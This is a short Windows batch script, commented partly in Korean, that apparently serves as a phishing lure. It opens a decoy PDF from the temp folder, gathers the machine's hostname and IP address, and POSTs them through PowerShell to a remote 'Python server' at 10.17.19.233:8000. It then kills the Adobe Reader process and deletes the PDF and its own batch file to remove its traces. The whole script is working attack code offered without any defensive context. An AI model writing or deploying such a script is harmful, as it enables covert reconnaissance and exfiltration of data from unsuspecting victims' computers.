@echo off
rem PDF 파일을 열도록 설정
start "" "%TEMP%\file.pdf"

rem Collect the hostname and IP address
setlocal
set HOSTNAME=%COMPUTERNAME%
for /f "tokens=2 delims=[]" %%a in ('ping -n 1 %COMPUTERNAME% ^| find "Pinging"') do set IP=%%a

rem Send the data to the Python server
powershell -Command "& {Invoke-WebRequest -Uri 'http://10.17.19.233:8000/report' -Method POST -Body @{hostname='%HOSTNAME%'; ip='%IP%'}}"

rem Wait for a few seconds to ensure the file has time to open
timeout /t 5 /nobreak > nul

rem Terminate the PDF reader process if it is still running
taskkill /f /im AcroRd32.exe > nul 2>&1

rem Clean up by deleting the downloaded files
del "%TEMP%\file.bat" > nul 2>&1
del "%TEMP%\file.pdf" > nul 2>&1

endlocal
